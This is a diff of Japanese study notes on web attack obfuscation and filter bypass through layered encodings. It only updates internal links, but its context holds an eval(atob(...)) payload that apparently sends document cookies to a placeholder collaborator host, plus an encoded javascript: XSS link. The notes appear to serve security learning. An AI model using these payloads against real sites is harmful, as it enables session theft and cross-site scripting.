@@ -16,8 +16,8 @@
 
 ## デコードの不一致を利用する
 
-- ペイロードに対して、URLエンコードとHTMLエンコードなど、異なるエンコードを複数かけること：[多段階encoding](#多段階encoding)
-- もしくは二重URLエンコード： [URL encoding](#URL%20encoding)
+- ペイロードに対して、URLエンコードとHTMLエンコードなど、異なるエンコードを複数かけること：[多段階encoding](Web攻撃の難読化.md#多段階encoding)
+- もしくは二重URLエンコード： [URL encoding](Web攻撃の難読化.md#URL%20encoding)
 - マイナーなエンコード
 
 ### なぜ成功するのか
@@ -146,7 +146,7 @@ eval('atob("ZmV0Y2goJ2h0dHBzOi8vQ09MTEFCT1JBVE9SX0RPTUFJTj9jPScrZG9jdW1lbnQuY29v
 #  多段階encoding
 
 - デコードの順序を理解する必要がある
-- `&bsol;u0061`[HTML encoding](#HTML%20encoding) -> `\u0061`[unicode escaping](#unicode%20escaping) → `a`
+- `&bsol;u0061`[HTML encoding](Web攻撃の難読化.md#HTML%20encoding) -> `\u0061`[unicode escaping](Web攻撃の難読化.md#unicode%20escaping) → `a`
 ```html
 <a href="javascript:&bsol;u0061lert(1)">Click me</a>
 ```
